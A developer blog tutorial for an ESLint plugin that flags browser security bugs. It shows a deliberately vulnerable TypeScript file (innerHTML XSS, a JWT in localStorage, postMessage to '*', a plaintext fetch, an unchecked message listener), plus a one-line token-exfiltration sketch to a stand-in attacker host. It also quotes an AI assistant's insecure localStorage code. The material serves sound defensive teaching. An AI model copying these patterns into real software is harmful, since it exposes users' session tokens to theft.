---
title: "4 Browser Security Bugs That Pass Code Review — One Lint Run, 8 CI Errors"
description: "JWT-in-localStorage, innerHTML XSS, postMessage('*'), a plaintext fetch — four bugs a type-checker and a backend pentest never see. One file, one `npx eslint .`, eight CWE-mapped errors. Includes the setup gotcha that silently skips your .ts files, and the metadata drift I found in my own plugin while capturing the run."
slug: "getting-started-eslint-plugin-browser-security"
canonical_url: "https://ofriperetz.dev/articles/getting-started-eslint-plugin-browser-security"
tier: "TUTORIAL"
devto_url: "https://dev.to/ofri-peretz/getting-started-with-eslint-plugin-browser-security-3iop"
devto_id: 3143592
published_at: "2026-01-02T15:20:36Z"
edited_at: "2026-01-11T10:21:38Z"
cover_image: "https://ofriperetz.dev/cdn/blog-cover-image/getting-started-eslint-plugin-browser-security.jpg?v=b2"
social_image: "https://ofriperetz.dev/cdn/blog-cover-image/getting-started-eslint-plugin-browser-security-og.jpg?v=b2"
reading_time_minutes: 9
tags:
  - "security"
  - "eslint"
  - "devsecops"
  - "node"
author:
  name: "Ofri Peretz"
  username: "ofri-peretz"
  avatar: "https://media2.dev.to/dynamic/image/width=640,height=640,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Fuser%2Fprofile_image%2F3669992%2F50a1f256-472c-48a1-85e8-149459647ea7.png"
  twitter: "ofriperetzdev"
series: "The Hardened Stack"
---

Here is `src/hook.ts` — four browser security bugs in one file. All of it compiles, all of it passes review, none of it is visible to the backend pentest your team scheduled for next quarter:

```ts
declare const el: HTMLElement;
declare const profile: { bio: string };
declare const jwt: string;
declare const widget: HTMLIFrameElement;
declare const authToken: string;
declare function applyAuth(t: string): void;

el.innerHTML = profile.bio; // renders fine; the reviewer checked layout, not sink context

localStorage.setItem("token", jwt); // first search result for "store JWT frontend"

widget.contentWindow?.postMessage({ authToken }, "*"); // straight from the vendor's docs

void fetch("http://api.example.com/session"); // dev uses http://; nobody changed it

window.addEventListener("message", (event) => {
  // no origin check on the way back in
  applyAuth(event.data.token);
});
```

An XSS sink (CWE-79), a token any injected script can read (CWE-922), a token broadcast to whatever origin holds that window (CWE-346), a session fetched in plaintext (CWE-319). None of it throws, none of it fails a unit test, and your type-checker is satisfied — `innerHTML` accepts a `string`. The pentest never touches any of it, because it all runs in the user's browser, after your server is done.

That is the shape of browser security debt: **it looks identical to correct code.** Nothing in the standard toolchain draws the line between the dangerous version and the safe one. A linter can — it is the one job a linter is unusually good at.

Here is `npx eslint .` on that file, with `eslint-plugin-browser-security` installed and nothing else configured:

```text
src/hook.ts
   8:1   error  🔒 CWE-79  OWASP:A05-Injection      CVSS:6.1  no-innerhtml
  10:1   error  🔒 CWE-922                                    no-sensitive-localstorage
  10:1   error  🔒 CWE-922 OWASP:A02-Cryptographic  CVSS:8.1  no-jwt-in-storage
  12:50  error  🔒 CWE-346 OWASP:A01-Broken         CVSS:7.5  no-postmessage-wildcard-origin
  14:6   error  🔒 CWE-319                                    require-https-only
  14:12  error  🔒 CWE-311 OWASP:A04-Cryptographic  CVSS:7.5  detect-mixed-content
  14:12  error  ⚠️ CWE-319 OWASP:A02-Cryptographic  CVSS:5.3  no-http-urls
  16:36  error  🔒 CWE-346                                    require-postmessage-origin-check

✖ 8 problems (8 errors, 0 warnings)
```

<sub>`eslint-plugin-browser-security@1.2.6` · ESLint 9.39.5 · Node v24.18.0 · captured 2026-07-28. Each real line also carries a plain-English description, a `Fix:` line, a docs URL, and the `browser-security/` rule prefix — cut here for width. Positions, rule ids and counts are verbatim: paste the file above and you should get the same eight.</sub>

Four bugs, eight errors, every one carrying a [CWE](https://ofriperetz.dev/articles/cwe-taxonomy-explained) id and most a [CVSS](https://ofriperetz.dev/articles/cvss-scores-explained) score. Forty-five rules cover that surface at v1.2.6. The rest of this article is the setup that produces that output, the three patterns worth understanding properly, and the honest edges — including a mislabel I found in my own metadata while capturing these runs.

---

## TL;DR

- **45 rules** (v1.2.6), every one carrying a `CWE` id, most carrying a CVSS score.
- **8 presets**: `flagship` (1 rule), `recommended` (31), `strict` (all 45), plus
  five **focused starter presets** for gradual adoption — `xss` (`no-innerhtml` +
  `no-eval`), `postmessage` (both wildcard + origin-check rules), and the one-rule
  footholds `storage` (`no-sensitive-localstorage`), `websocket`
  (`require-websocket-wss`), `cookies` (`no-sensitive-cookie-js`).
- **Flat config**, CommonJS (loads from `eslint.config.js` and `.mjs`), ESLint
  `^8 || ^9 || ^10`, Node `>= 18`, npm/yarn/pnpm/bun. ESLint is the only peer
  dependency — it reads source, so there is nothing to add at runtime. The
  flagship rule also runs under Oxlint's JS-plugin runner via the
  `interlace-browser-security` port, parity-checked in CI; the full 45 are ESLint
  today.
- It matches _source patterns_, not runtime behaviour. It cannot evaluate the CSP
  your server sends or prove your sanitizer is complete. Earliest layer, not the
  only one.

---

## Get it running

```bash
npm install --save-dev eslint-plugin-browser-security
# yarn add --dev · pnpm add --save-dev · bun add --dev — plain dev dependency
```

Flat config — `eslint.config.js` or `eslint.config.mjs`, the package is CommonJS
and loads from both. This is the whole file for a TypeScript project:

```js
// `configs` is a NAMED export; the default export is the plugin object.
import { configs } from "eslint-plugin-browser-security";
import tsParser from "@typescript-eslint/parser";

export default [
  { files: ["**/*.ts", "**/*.tsx"], languageOptions: { parser: tsParser } },
  // or: strict · flagship · xss · storage · postmessage · websocket · cookies
  configs.recommended,
];
```

```bash
npx eslint .
```

**Do not drop the `files` + `parser` entry.** `configs.recommended` ships the
rules and the plugin but registers neither, so on its own, flat config skips
every `.ts` file in the project. Silently under `npx eslint .`; on an explicit
path it at least tells you:

```text
src/auth.ts
  0:0  warning  File ignored because no matching configuration was supplied
```

Zero errors, exit code 0, green CI — and the plugin looks broken when it simply
never saw your files. That cost me ten minutes while capturing the runs in this
article, which is the cheap version of the lesson: a suspiciously clean position
is the one you re-examine before you move. The
[reproducibility](https://ofriperetz.dev/articles/reproducibility-vs-replicability)
habit is one line of effort — pin the versions you ran, and if the count is zero,
lint a file you _know_ is dirty before you believe it.

Onboarding a whole inherited codebase rather than one repo you own? The
[30-minute security audit protocol](https://ofriperetz.dev/articles/the-30-minute-security-audit-onboarding-a-new-codebase)
sequences several plugins across it without drowning you in run one.

---

## The `postMessage` pair: two decisions, and most code makes neither

`postMessage` is the most common source of token exfiltration I see in frontend
code, because it asks you to get two independent things right — one on the way
out, one on the way back in — and the failure mode of each is silence.

### Send side — `"*"` is not a default, it is a disabled check

```ts
// ❌ no-postmessage-wildcard-origin (CWE-346, CVSS 7.5)
widget.contentWindow.postMessage({ authToken }, "*");

// ✅ name the exact origin you intend to talk to
widget.contentWindow.postMessage({ authToken }, "https://widget.example.com");
```

The second argument is a **delivery filter**, not decoration. The browser hands
the message to `widget` only if `widget`'s _current_ origin matches the target
you name. `"*"` switches that off, so the message is delivered whatever origin
now occupies the window. If the iframe has navigated — an OAuth redirect, an ad,
a compromised third-party widget — **they receive your token**.

### Receive side — a listener with no `origin` check trusts anyone

```ts
// ❌ require-postmessage-origin-check (CWE-346)
window.addEventListener("message", (event) => {
  applyAuth(event.data.token); // any page that can reach this window can drive it
});

// ✅ validate the sender before you trust the payload
window.addEventListener("message", (event) => {
  if (event.origin !== "https://widget.example.com") return;
  if (event.source !== widget.contentWindow) return; // the window you opened
  applyAuth(event.data.token);
});
```

Any page holding a reference to your window — your opener, a page that embedded
you, a popup you spawned — can `postMessage` into that listener. With no
`event.origin` check, attacker-sent data flows straight into your auth state.

The `event.source` line is the part even careful code misses: `event.origin`
answers "what origin sent this," not "which window sent this." Embed _two_ frames
from `https://widget.example.com` — the real one and an attacker-influenced
instance, say an ad slot the widget loaded itself — and both pass the string
compare. `require-postmessage-origin-check` enforces the origin gate; the source
pin is second-order and a linter cannot infer it, because it doesn't know which
window object you meant. Treat the rule as the floor, not the ceiling.

Put the two halves together and the chain is short. You post the session token to
a third-party widget with `"*"`; its CDN is compromised months later, or the
iframe `src` gets swapped by a redirect; the attacker's code, now running in that
frame, receives every message aimed at it and `fetch`es the token out. No XSS in
_your_ origin required — you handed it across the boundary yourself.

---

## JWT in `localStorage`: the line your assistant writes for you

`localStorage` is readable by **any** JavaScript running on your origin — an
injected `<script>` from any XSS, a compromised npm dependency, a malicious
browser extension. There is no `HttpOnly` for `localStorage`; exfiltration is one
`fetch(attacker, { body: localStorage.token })`. Put the token where script
cannot reach it: `Set-Cookie: token=…; HttpOnly; Secure; SameSite=Strict`, issued
by the server.

You already knew that. The rule earns its place in CI because knowing it doesn't
help. Ask any assistant to _"store the JWT and read it back on reload"_ and you
get `localStorage.setItem(...)` in the first response, essentially every time —
that is the statistical centre of a decade of answers and starter repos that took
the easy path, and the insecure version runs identically to the safe one.

I ran that round trip for this article. Verbatim into the `claude` CLI — _"Write
a TypeScript function that stores the JWT and reads it back on page reload."_
The function it returned, pasted as-is:

```ts
// generated output, unedited
const JWT_KEY = "jwt";

export const storeJwt = (token: string): void =>
  localStorage.setItem(JWT_KEY, token);
export const readJwt = (): string | null => localStorage.getItem(JWT_KEY);
```

Dropped into a project running `configs.recommended`, that is **two errors on one
line** — `no-sensitive-localstorage` and `no-jwt-in-storage`, both CWE-922, both
at `5:3`, `JWT_KEY` quoted back at you in the message. The part worth noticing:
that run was against a _security-tuned_ assistant which appended its own "prefer
HttpOnly cookies" caveat in prose — and still emitted the `localStorage` version
as the actual code. The caveat in the chat window does not stop the insecure line
from landing in the file. The rule does.

Which is the argument for CI over review. A reviewer fixes one `localStorage`
call; the next prompt regenerates it. A rule flags the regenerated bug exactly as
reliably as the original, and the [base
rate](https://ofriperetz.dev/articles/base-rate-problem-explained) of this
pattern in generated auth code is high enough that "we'll catch it in review" is
a plan which fails quietly.

`no-jwt-in-storage`, `no-sensitive-localstorage`, `no-sensitive-sessionstorage`,
and `no-sensitive-indexeddb` (all **CWE-922**) cover the storage surface. For
hardcoded API keys and inline secrets, the companion
[`eslint-plugin-secure-coding`](https://ofriperetz.dev/articles/getting-started-eslint-plugin-secure-coding)
catches those separately — including an [autofix for AI-generated hardcoded
secrets](https://ofriperetz.dev/articles/hardcoded-secrets-ai-agents-autofix).

---

## Credentials in URLs: know exactly what it matches

Two rules cover credentials leaking through the URL itself:

| Rule                             | Prints     | Preset        | What it matches                                                                                                                        |
| -------------------------------- | ---------- | ------------- | -------------------------------------------------------------------------------------------------------------------------------------- |
| `no-credentials-in-query-params` | CWE-798 ⚠️ | `recommended` | A string or template literal containing `?` or `&` followed by `password=`, `token=`, `apikey=`, `secret=`, `auth=` (case-insensitive) |
| `no-password-in-url`             | CWE-521 ⚠️ | `strict` only | `http(s)://user:secret@host` — credentials in the URL's userinfo section                                                               |

<sub>⚠️ Both of those CWE ids are wrong. That is the next section.</sub>

```ts
// ❌ no-credentials-in-query-params
fetch(`https://api.example.com/data?apiKey=${apiKey}`);
// Appears in access logs, browser history, and Referer headers on every outgoing link

// ✅ send credentials in the Authorization header
fetch("https://api.example.com/data", {
  headers: { Authorization: `Bearer ${apiKey}` },
});
```

**Read that match list before you trust it.** It is a substring check, not a
semantic one. `?apiKey=` fires; `?api_key=` — same secret, snake_case — does not.
That is a false negative, and it is the honest shape of this rule class: a name
heuristic, not [taint
analysis](https://ofriperetz.dev/articles/taint-vs-heuristic-detection). It
cannot follow a value from source to sink; it recognises spellings someone
listed. Better you learn that from the tutorial than from a breach.

Which brings me to the part I was not planning to write.

---

## The rule ids are solid. The labels drift.

Every finding carries three labels past the rule id: a CWE, an [OWASP Top
10](https://ofriperetz.dev/articles/owasp-top-10-explained) category, and a CVSS
score with a severity word. Capturing these runs, I read them properly for the
first time in a while. Two things are wrong at v1.2.6.

**The URL-credential rules file the wrong weakness.** They print `CWE-798` and
`CWE-521` — _Use of Hard-coded Credentials_ and _Weak Password Requirements_.
Neither is this. A credential in a query string is CWE-598, _Use of GET Request
Method With Sensitive Query Strings_: a secret exposed through an insecure
transmission path, not one baked into source at build time. The rule's own file
cites definition 598 in its header comment and then emits 798 from its metadata.
The [taxonomy](https://ofriperetz.dev/articles/cwe-taxonomy-explained) id is how
a finding gets routed, deduplicated against a CVE database and prioritised — file
a transmission weakness as a hard-coded-credential one and a good triager closes
it as a duplicate of your secret scanner. `no-password-in-url` also prints
severity `CRITICAL` beside CVSS 5.3, which is Medium under the [3.1
bands](https://ofriperetz.dev/articles/cvss-scores-explained); severity is not
derived from the score, so the two drift apart on their own. Same genus as the
bug I found when I [audited 203 of our own rules and 16% mislabelled their own
CVSS score](https://ofriperetz.dev/articles/i-audited-203-of-our-own-eslint-security-rules-16-mislabel-their-own-cvss-score).

**The OWASP tags come from two different editions.** One `http://` literal:

```text
src/session.ts
  2:9  error  🔒 CWE-311 OWASP:A04-Cryptographic CVSS:7.5  detect-mixed-content
  2:9  error  ⚠️ CWE-319 OWASP:A02-Cryptographic CVSS:5.3  no-http-urls
```

Same line, same weakness family, tagged `A04-Cryptographic` and
`A02-Cryptographic`. Neither is a typo: rules declaring their own OWASP category
use the **2021** list, where Cryptographic Failures is A02; rules deriving theirs
from a CWE use the **2025** list, where it moved to A04. Each is right for its
edition, and the pair is useless for sorting unless you know which edition you
are reading.

The practical rule, here or in any tool: group findings by rule id, which is
exact, and treat the OWASP tag as a
[proxy](https://ofriperetz.dev/articles/proxy-metrics) for the compliance
conversation rather than a key. These are metadata fixes, not detection fixes —
every rule still fires on exactly the code it claims to. I would rather you read
that here than meet it in a triage meeting.

---

## The full rule set

All 45 at v1.2.6, grouped by category, with the CWE each rule actually emits
(verified against the rule sources on 2026-07-28 — including the two flagged
above as mislabelled):

| Surface                | CWE                        | Rules                                                                                                                                                                          |
| ---------------------- | -------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| XSS / DOM injection    | CWE-79                     | `no-innerhtml` `no-filereader-innerhtml` `no-postmessage-innerhtml` `no-websocket-innerhtml` `no-worker-message-innerhtml` `no-unescaped-url-parameter` `no-unsafe-inline-csp` |
|                        | CWE-95                     | `no-eval` `no-websocket-eval` `no-unsafe-eval-csp`                                                                                                                             |
| Token & data storage   | CWE-922                    | `no-jwt-in-storage` `no-sensitive-localstorage` `no-sensitive-sessionstorage` `no-sensitive-indexeddb`                                                                         |
|                        | CWE-798 ⚠️ _should be 598_ | `no-credentials-in-query-params`                                                                                                                                               |
|                        | CWE-521 ⚠️ _should be 598_ | `no-password-in-url`                                                                                                                                                           |
|                        | CWE-200                    | `no-sensitive-data-in-cache`                                                                                                                                                   |
| Transport              | CWE-319                    | `no-http-urls` `require-https-only` `no-unencrypted-transmission`                                                                                                              |
|                        | CWE-311                    | `detect-mixed-content`                                                                                                                                                         |
|                        | CWE-295                    | `no-disabled-certificate-validation` `no-allow-arbitrary-loads`                                                                                                                |
| postMessage            | CWE-346                    | `no-postmessage-wildcard-origin` `require-postmessage-origin-check`                                                                                                            |
| WebSocket              | CWE-319                    | `no-insecure-websocket` `require-websocket-wss`                                                                                                                                |
| Cookies                | CWE-1004                   | `no-cookie-auth-tokens` `no-sensitive-cookie-js`                                                                                                                               |
|                        | CWE-614                    | `require-cookie-secure-attrs`                                                                                                                                                  |
| CORS / CSRF / headers  | CWE-942                    | `no-permissive-cors`                                                                                                                                                           |
|                        | CWE-346                    | `no-missing-cors-check`                                                                                                                                                        |
|                        | CWE-352                    | `no-missing-csrf-protection`                                                                                                                                                   |
|                        | CWE-693                    | `no-missing-security-headers`                                                                                                                                                  |
|                        | CWE-1021                   | `require-csp-headers` `no-clickjacking`                                                                                                                                        |
| Redirects, URLs & misc | CWE-601                    | `no-insecure-redirects` `require-url-validation`                                                                                                                               |
|                        | CWE-939                    | `no-unvalidated-deeplinks`                                                                                                                                                     |
|                        | CWE-829                    | `no-dynamic-service-worker-url`                                                                                                                                                |
|                        | CWE-434                    | `require-mime-type-validation`                                                                                                                                                 |
|                        | CWE-401                    | `require-blob-url-revocation`                                                                                                                                                  |
|                        | CWE-602                    | `no-client-side-auth-logic`                                                                                                                                                    |
|                        | CWE-359                    | `no-sensitive-data-in-analytics` `no-tracking-without-consent`                                                                                                                 |

One caveat on the CORS/CSRF/header block: those rules match _source-level
expressions_ that configure a policy. They catch code setting a permissive CORS
config or omitting a CSP header value in your application source — not a policy
your reverse proxy enforces separately.

That is all 45 (10 + 7 + 6 + 2 + 2 + 3 + 6 + 9). `recommended` turns on 31;
`strict` turns on all 45. The 14 `recommended` leaves off, so you can turn them
on deliberately rather than discover them missing: `no-password-in-url`,
`no-unescaped-url-parameter`, `no-unencrypted-transmission`,
`no-disabled-certificate-validation`, `no-sensitive-data-in-cache`,
`require-url-validation`, `require-mime-type-validation`, the five
CORS/CSRF/header rules, and the two analytics/consent rules. Start at
`recommended`, graduate to `strict` once it is quiet.

If you want the client-side surface scored against the OWASP framework rather
than rule-by-rule, I mapped [which OWASP categories ESLint rules actually hold
up against](https://ofriperetz.dev/articles/mapping-your-codebase-to-owasp-top-10-with-247-eslint-rules)
separately — including the two that turn out to be vendor theatre.

---

## What it does — and doesn't — see

- **Source patterns, not runtime.** It matches `innerHTML =`, `postMessage(…, "*")`,
  `http://` literals, `localStorage.setItem("token", …)`. It does **not** evaluate
  the CSP your server emits or prove a sanitizer is complete — the header rules
  check that you _set_ a policy in source, not that the policy is airtight.
- **Heuristics cut both ways.** The storage and "sensitive data" rules match on
  names, so `?api_key=` slips through while `?apiKey=` fires, and a variable
  innocently called `tokenCount` trips `no-sensitive-localstorage` (I checked —
  it does). That is the
  [false-negative / false-positive](https://ofriperetz.dev/articles/confusion-matrix-tp-fp-fn-tn)
  trade every name heuristic makes, and why this sits below
  [taint-tracking SAST](https://ofriperetz.dev/articles/static-analysis-vs-sast-vs-linting)
  rather than replacing it. Tune the option lists; the defaults are not exhaustive.
- **A green run is not a secure app.** Once "zero browser-security errors" becomes
  the goal rather than the signal, it stops measuring anything —
  [Goodhart](https://ofriperetz.dev/articles/goodharts-law-explained) applies to
  lint counts like any other dashboard number.
- **It's the earliest layer.** Pair it with a real CSP, framework escaping
  (React/Solid/Svelte auto-escape — these rules catch where you opt _out_ via
  `dangerouslySetInnerHTML` and friends), and runtime monitoring.

---

## Where this sits in the ecosystem

General linters and React-specific rules (`eslint-plugin-no-unsanitized`,
`react/no-danger`) cover slices of this — usually the `innerHTML` corner.
`browser-security` is the framework-agnostic layer for the _whole_ browser
surface: transport, storage, cookies, CORS/CSRF, `postMessage`, WebSocket,
service workers. For where it sits against the field on a shared corpus, I
published [17 ESLint security plugins
compared](https://ofriperetz.dev/articles/benchmark-17-eslint-security-plugins-compared),
scored on [precision and
recall](https://ofriperetz.dev/articles/precision-recall-f1-for-static-analysis)
rather than rule counts. I built both the tool and the corpus, so read it with
the suspicion that deserves.

The token in that `localStorage` call also has to come from somewhere. This
plugin catches the client mishandling it; on the issuing side,
[`eslint-plugin-jwt-security`](https://ofriperetz.dev/articles/getting-started-eslint-plugin-jwt-security)
catches the server that signs it wrong — most infamously the
[`alg: none` forgery](https://ofriperetz.dev/articles/the-jwt-algorithm-none-attack-the-vulnerability-in-1-line-of-code-d9g),
where a one-character header change mints an admin token. Run both and the JWT's
whole round trip is covered: minted, signed, transported, stored.

---

## Links

- 📦 [npm: eslint-plugin-browser-security](https://www.npmjs.com/package/eslint-plugin-browser-security)
- 📖 [Full rule docs (per-rule CWE + examples)](https://eslint.interlace.tools/docs/security/plugin-browser-security/rules)
- 💻 [Source on GitHub](https://github.com/ofri-peretz/eslint/tree/main/packages/eslint-plugin-browser-security)

Install it, keep the parser line, run `npx eslint .` on your frontend. Five
minutes, and the first finding is almost always a `localStorage` token or a
`postMessage` wildcard nobody remembers writing. Don't take my eight errors on
trust either — the file that produced them is up there; paste it and see whether
your run agrees with mine.

Two of the 45 rules print the wrong CWE today, and I would like the next version
of this article to say they don't. If you find a third — a rule that fires on
code you can defend, or stays quiet on code you can't — the [issue
tracker](https://github.com/ofri-peretz/eslint/issues) is the fastest route to a
fix. The third-party-widget cases interest me most: the analytics snippet, the
chat bubble, the embedded checkout you handed a token to with `"*"` because the
vendor's own docs told you to.

::dev-to-cta{url="https://www.npmjs.com/package/eslint-plugin-browser-security"}
📦 `npm install --save-dev eslint-plugin-browser-security` — 45 CWE-mapped rules for the browser surface.
::

---

_[eslint-plugin-browser-security](https://www.npmjs.com/package/eslint-plugin-browser-security) is part of the [Interlace ESLint ecosystem](https://eslint.interlace.tools). Source on [GitHub](https://github.com/ofri-peretz/eslint) · Follow: [Dev.to/ofri-peretz](https://dev.to/ofri-peretz)_

---

I'm **Ofri Peretz**, a security engineering leader and the author of the
Interlace ESLint ecosystem — domain-specific static analysis for security,
reliability, and performance on the Node.js stack. `browser-security` is its
client-side layer.

[ofriperetz.dev](https://ofriperetz.dev) · [LinkedIn](https://linkedin.com/in/ofri-peretz) · [GitHub](https://github.com/ofri-peretz)

---

**The Hardened Stack series** — guarding one request end to end:

← _Issuing side:_ [eslint-plugin-jwt-security — the server that signs the token](https://ofriperetz.dev/articles/getting-started-eslint-plugin-jwt-security)
· **You are here:** the browser that stores it ·
_Next:_ [What 12 seconds of ESLint found in an inherited NestJS codebase](https://ofriperetz.dev/articles/i-inherited-a-nestjs-codebase-the-first-lint-run-found-6-vulnerabilities) →
